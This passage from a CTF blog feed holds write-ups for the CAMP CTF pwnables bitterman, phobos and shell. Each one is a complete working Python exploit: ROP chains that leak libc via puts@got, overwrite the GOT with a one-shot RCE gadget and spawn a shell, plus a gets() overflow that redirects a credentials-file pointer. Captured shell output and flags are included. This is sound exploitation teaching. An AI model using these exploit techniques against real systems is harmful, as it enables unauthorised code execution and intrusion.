-<p>The <code>x</code> after the <code>BBBB</code> in the above example was actually <code>0x7f</code>, so the binary is leaking part of an address (we later determined it to be a stack address). In the end, I couldn&rsquo;t make use of this, but it was interesting to see. Swappage already found the bugs: we can send a large message length and this will allow us to overflow a stack buffer. NX is enabled so it&rsquo;s ROP time!</p>
-
-<p>Besides NX, ASLR is also enabled. This means we have to first leak a libc address to calculate libc&rsquo;s base address and then something like <code>system()</code>. I made use of the <code>puts@plt</code> to write out the contents of <code>puts@got</code>. The latter contains the libc address of <code>puts()</code>, which we can then receive. Superkojiman was able to find the one-shot RCE gadget. The ROP chain goes to <code>read@plt</code> and awaits our input. Upon receiving the address of the one-shot RCE gadget in libc, the ROP chain overwrites <code>puts@got</code> and restarts the binary from <code>main()</code>. This latter decision was based on using <code>system()</code> instead of the one-shot RCE gadget, but by the time I was done implementing the ROP chain, superkojiman had already supplied the offset. When <code>main()</code> restarts, one of the first functions it calls is <code>puts@plt</code>, which is now pointing to the shell-spawning one-shot RCE gadget. We land a shell and are happy!</p>
-
-<pre><code class="python">#!/usr/bin/python
-import struct, time
-from socket import *
-
-def q(x):
-    return struct.pack("&lt;Q", x)
-
-def readtil(delim):
-  buf = b''
-  while not delim in buf:
-      buf += s.recv(1)
-  return buf
-
-payload = "A"*152   # ty Swappage!
-
-'''
-0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
-0x00000296 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-0x00000060 : pop rbp; ret
-'''
-
-base = 0x400590
-# prologue, needed for later! after the [call r12 + rbx*8], there is
-# a cmp rbx, rbp. At this point, rbx is 1 and if rbp is not equal to rbx, 
-# the code jumps back instead of leading to a ret!
-# therefore, we set up rbp first. 
-payload += q(0x00000060+base)   # pop rbp ; ret
-payload += q(1) # value for rbp
-
-# first, we set up some registers, which will later be put in the correct registers
-# puts() uses rdi as argument
-payload += q(0x000002bc+base)
-payload += q(0x600c50)  # value for r12 -&gt; puts@got
-payload += q(0)         # value for r13 -&gt; goes into rdx 
-payload += q(0)         # value for r14 -&gt; goes into rsi
-payload += q(0x600c50)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()
-
-# swap around the registers and call puts()
-payload += q(0x00000296+base)
-payload += q(0) * 7
-# without this, we don't get output
-payload += q(0x400570)  # fflush@plt
-
-# now read() to overwrite printf()
-# read() is blocking and will wait for our input :)
-# again, first set up rbp
-payload += q(0x00000060+base)   # pop rbp ; ret
-payload += q(1) # value for rbp
-
-# set up registers/arguments for read()
-payload += q(0x000002bc+base)
-payload += q(0x600c60)  # value for r12 -&gt; read@got
-payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
-payload += q(0x600c50)  # value for r14 -&gt; goes into rsi -&gt; overwrite puts@got
-payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin
-
-payload += q(0x00000296+base)
-payload += q(0) * 7
-
-# restart main(), so the binary will execute puts() -&gt; one shot rce, lands a shell
-# could've just a easily return to puts@plt...
-payload += q(0x4006ec) 
-
-def pwn():
-    global s
-    s = socket(AF_INET, SOCK_STREAM)
-    s.connect(('challs.campctf.ccc.ac', 10103))
-
-    readtil('name?')
-    s.send('a\n')
-    readtil('message:')
-    s.send('-1\n')   # ty Swappage!
-    readtil('text:')
-    s.send(payload+'\n')
-
-    readtil('Thanks!\n')
-    data = s.recv(8)
-    data = data[:-1] + "\x00\x00"
-    puts_addr = struct.unpack('&lt;Q', data)[0]
-    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])
-
-    libc_base = puts_addr - 0x70a30
-    print "[+] libc base addr: " + hex(libc_base)
-    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
-    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"
-
-    # the rop chain will wait at read(), because that is blocking
-    # send the address to overwrite puts@got
-    s.send(q(system_addr))
-
-    import telnetlib
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-pwn()
-</code></pre>
-
-<p>The reason for setting up <code>rbp</code>:</p>
-
-<pre><code>  400839:   call   QWORD PTR [r12+rbx*8]
-  40083d:   add    rbx,0x1
-  400841:   cmp    rbx,rbp  ; if rbx != rbp, we jump back!
-  400844:   jne    400830 
-  400846:   add    rsp,0x8  ; we wanna go here!
-  40084a:   pop    rbx
-  40084b:   pop    rbp
-  40084c:   pop    r12
-  40084e:   pop    r13
-  400850:   pop    r14
-  400852:   pop    r15
-  400854:   ret    
-</code></pre>
-
-<p>And the exploit in action:</p>
-
-<pre><code class="bash">[+] Leaked puts(): 0x7fb9d6487a30
-[+] libc base addr: 0x7fb9d6417000
-[+] sending one shot rce addr (0x7fb9d645b2aa)
-id
-uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
-whoami
-challenge
-ls -alh
-total 40K
-drwxr-xr-x 2 root root 4.0K Aug 13 13:46 .
-drwxr-xr-x 3 root root 4.0K Aug  5 21:43 ..
--rw-r--r-- 1 root root  220 Aug  5 19:55 .bash_logout
--rw-r--r-- 1 root root 3.7K Aug  5 19:55 .bashrc
--rw-r--r-- 1 root root  675 Aug  5 19:55 .profile
--rwxr-xr-x 1 root root  11K Aug 12 01:28 bitterman
--rw-r--r-- 1 root root   43 Aug 13 13:47 flag.txt
--rwxr-xr-x 1 root root   64 Aug 12 01:34 run.sh
-cat flag.txt
-CAMP15_a786be6aca70bfd19b6af86133991f80  -
-</code></pre>
-
-<h2>Phobos</h2>
-
-<p>Next, we turned to phobos for 300 points, which is nearly the same binary but without NX! After a few small changes to the previous exploit, we obtained the flag for phobos as well:</p>
-
-<pre><code class="python">#!/usr/bin/python
-import struct, time
-from socket import *
-
-def q(x):
-    return struct.pack("&lt;Q", x)
-
-def readtil(delim):
-  buf = b''
-  while not delim in buf:
-      buf += s.recv(1)
-  return buf
-
-payload = "A"*136   # ty Swappage!
-
-'''
-0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
-0x000002b6 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-0x00000060 : pop rbp; ret
-'''
-
-base = 0x400590
-# prologue, needed for later!
-payload += q(0x00000060+base)   # pop rbp ; ret
-payload += q(1) # value for rbp
-
-payload += q(0x000002dc+base)
-payload += q(0x600c70)  # value for r12 -&gt; puts@got
-payload += q(0)         # value for r13 -&gt; goes into rdx 
-payload += q(0)         # value for r14 -&gt; goes into rsi
-payload += q(0x600c70)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()
-
-payload += q(0x000002b6+base)
-payload += q(0) * 7
-payload += q(0x400570)  # fflush@plt
-
-# now read() to overwrite printf()
-payload += q(0x00000060+base)   # pop rbp ; ret
-payload += q(1) # value for rbp
-
-payload += q(0x000002dc+base)
-payload += q(0x600c80)  # value for r12 -&gt; read@got
-payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
-payload += q(0x600c70)  # value for r14 -&gt; goes into rsi -&gt; overwrite printf()
-payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin
-
-payload += q(0x000002b6+base)
-payload += q(0) * 7
-
-payload += q(0x4006ec) # restart, so the binary will execute puts() -&gt; one shot rce, lands a shell
-
-def pwn():
-    global s
-    s = socket(AF_INET, SOCK_STREAM)
-    s.connect(('challs.campctf.ccc.ac', 10106))
-    #s.connect(('localhost', 4444))
-
-    print readtil('name?')
-    s.send('a\n')
-    print readtil('message:')
-    s.send('-1\n')   # ty Swappage!
-    print readtil('text:')
-    s.send(payload+'\n')
-    print readtil('Thanks!\n')
-
-    data = s.recv(8)
-    data = data[:-1] + "\x00\x00"
-
-    puts_addr = struct.unpack('&lt;Q', data)[0]
-    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])
-    libc_base = puts_addr - 0x70a30
-    print "[+] libc base addr: " + hex(libc_base)
-    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
-    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"
-
-    s.send(q(system_addr))
-
-    import telnetlib
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-pwn()
-</code></pre>
-
-<p>And in action:</p>
-
-<pre><code class="bash">bas@tritonal:~/bin/ccc/phobos$ python poc2.py 
-&gt; What's your name?
-
-Hi, a
-&lt;randomjunk&gt;
-&gt; Please input the length of your message:
-
-&gt; Please enter your text:
-
-&gt; Thanks!
-
-[+] Leaked puts(): 0x7fa6830dda30
-[+] libc base addr: 0x7fa68306d000
-[+] sending one shot rce addr (0x7fa6830b12aa)
-id
-uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
-cat flag.txt
-CAMP15_0ae754f04a8782cba9a7ec2c69dc1274
-</code></pre>
-
-<p>It&rsquo;s quite nice to solve a 400 point challenge only to find out we can use nearly the same solution for an additional 300 points!</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[CAMP CTF - Shell]]></title>
-    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-shell/"/>
-    <updated>2015-08-18T21:30:07+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-shell</id>
-    <content type="html"><![CDATA[<p>shell was a pwnable from CAMP CTF. We&rsquo;re given a 64-bit ELF binary, which shows the following when executed:</p>
-
-<!--more-->
-
-
-<pre><code class="bash">bas@tritonal:~/bin/ccc/shell$ ./shell
-$ help
-sh whoami date exit ls help hlep login
-$ sh
-Permission denied
-$ login
-Username: AAAA
-Password: BBBB
-Authentication failed!
-$ 
-</code></pre>
-
-<p>Furthermore, the output of <code>strings ./shell</code> shows that the binary is looking for <code>creds.txt</code>. I placed a file in the same directory with <code>admin:admin</code> as sole line and indeed, I could now login:</p>
-
-<pre><code class="bash">$ login
-Username: admin
-Password: admin
-Authenticated!
-# sh
-$
-</code></pre>
-
-<p>So we&rsquo;ll need to login with valid credentials, which we do not have yet. The rest of the commands are not of interest. Let&rsquo;s have a look at the disassembly, specifically at the part where our input is processed:</p>
-
-<pre><code>  400c2a:   movabs rdi,0x400f89
-  400c34:   mov    al,0x0
-  400c36:   call   400750 &lt;printf@plt&gt;
-  ; this is the buffer it's using
-  400c3b:   lea    rdi,[rbp-0x80]               
-  400c3f:   add    rdi,0x4
-  400c46:   mov    DWORD PTR [rbp-0xd0],eax
-  400c4c:   mov    al,0x0
-  ; here we get the username
-  400c4e:   call   400790 &lt;gets@plt&gt;
-  400c53:   movabs rdi,0x400f94
-  400c5d:   mov    DWORD PTR [rbp-0xd4],eax
-  400c63:   mov    al,0x0
-  400c65:   call   400750 &lt;printf@plt&gt;
-  ; this is the buffer for password
-  400c6a:   lea    rdi,[rbp-0x80]
-  400c6e:   add    rdi,0x24
-  400c75:   mov    DWORD PTR [rbp-0xd8],eax
-  400c7b:   mov    al,0x0
-  400c7d:   call   400790 &lt;gets@plt&gt;
-  400c82:   movabs rsi,0x400f9f
-  ; i suppose I can overwrite this value
-  400c8c:   mov    rdi,QWORD PTR [rbp-0x18]     ; creds.txt
-  400c90:   mov    DWORD PTR [rbp-0xdc],eax
-  400c96:   call   4007b0 &lt;fopen@plt&gt;
-</code></pre>
-
-<p>So basically, the calls to <code>gets()</code> happen to write to the stack. We&rsquo;re not able to overwrite the saved return address because of the canary, but we can overwrite the pointer at <code>[rbp-0x18]</code>, which contains a pointer to the string <code>creds.txt</code>. We can overwrite this with a pointer to another string, to make the binary open another file to check our credentials!</p>
-
-<p>The only option that I could find was <code>/lib64/ld-linux-x86-64.so.2</code>. The problem is, does this actually contain valid pairs of <code>user:name</code>? I grabbed the file via a shell I obtained on bitterman and ran it through strings:</p>
-
-<pre><code>bas@tritonal:~/bin/ccc/shell$ strings ./ld.so |grep ":"
-|F:m
-&lt;:uR
-sHu:H9
-...snip...
-FATAL: kernel too old
-Unused direct dependencies:
-    Version information:
-    %s:
-prelink checking: %s
-wrong ELF class: ELFCLASS32
-undefined symbol: 
-relocation processing: %s%s
-...snip...
-</code></pre>
-
-<p>Indeed, it does! So the plan is to overwrite the pointer on the stack with the pointer to <code>/lib64/ld-linux-x86-64.so.2</code>, then login with one of those combinations of &ldquo;username&rdquo; and &ldquo;password&rdquo;. The exploit:</p>
-
-<pre><code class="python">#!/usr/bin/python
-import struct, time
-from socket import *
-
-def q(x):
-    return struct.pack("&lt;Q", x)
-
-def readtil(delim):
-  buf = b''
-  while not delim in buf:
-      buf += s.recv(1)
-  return buf
-
-def pwn():
-    global s
-    s = socket(AF_INET, SOCK_STREAM)
-    s.connect(('challs.campctf.ccc.ac', 10117))
-
-    readtil('$')
-    s.send('login\n')
-    readtil('Username:')
-    s.send('AAAA\n')
-    readtil('Password:')
-    # overwrite rbp-0x18, which used to contain a pointer to "creds.txt"
-    # overwrite it with a pointer to 0x400200 ("/lib64/ld-linux-x86-64.so.2")
-    # I harvested this file already via one of the other challenges
-    s.send("A"*68+q(0x400200)+'\n')
-
-    readtil('$')
-    s.send('login\n')
-    readtil('Username:')
-    s.send('relocation processing\n')
-    readtil('Password:')
-    s.send(' %s%s\n')
-
-    import telnetlib
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-pwn()
-</code></pre>
-
-<p>And it action:</p>
-
-<pre><code class="bash">bas@tritonal:~/bin/ccc/shell$ python ./poc.py 
- Authenticated!
-# id
-Command not found
-# sh
-ls
-creds.txt
-flag.txt
-run.sh
-shell
-cat flag.txt
-CAMP15_408eed038796cfca32e2fdb3a8126429
-</code></pre>
 ]]></content>
   </entry>
   
